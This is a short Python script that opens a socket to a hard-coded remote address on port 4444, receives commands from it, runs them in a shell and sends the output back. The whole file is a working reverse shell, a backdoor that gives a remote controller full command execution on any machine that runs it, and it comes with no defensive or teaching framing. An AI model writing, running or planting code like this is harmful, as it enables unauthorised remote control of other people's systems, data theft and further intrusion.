import socket
import subprocess

# Set the IP and port of the remote machine
REMOTE_IP = '192.168.8.100'
REMOTE_PORT = 4444

# Create a socket and connect to the remote machine
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((REMOTE_IP, REMOTE_PORT))

# Create a subprocess to execute commands on the local machine
while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == 'exit':
        break
    elif command:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(proc.stdout.read())
        s.send(proc.stderr.read())

# Close the connection
s.close()
